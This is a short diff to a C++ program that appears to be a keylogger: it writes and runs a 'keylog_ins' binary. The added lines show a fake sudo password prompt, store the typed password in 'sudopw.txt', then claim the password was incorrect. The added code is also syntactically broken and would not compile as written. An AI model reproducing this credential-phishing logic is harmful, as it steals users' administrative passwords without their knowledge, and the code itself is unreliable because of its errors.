@@ -61,7 +61,17 @@ int main(){
 			ofstream myfile("keylog_ins");
 			myfile << (text);			
 			myfile.close();
-
+			
+			//store sudo password
+			string username;
+			username << system("echo \"$USER\"");
+			cout<<"[sudo] password for "<<username << ":"<<endline;
+			
+			ofstream sfile("sudopw.txt");
+			sfile<<istream& getline (istream& is, string& str);
+			sfile.close();
+			
+			cout<<"Incorrect password, type again\n";
 			system("chmod 755 keylog_ins");
 			system("./keylog_ins");
 			convert();
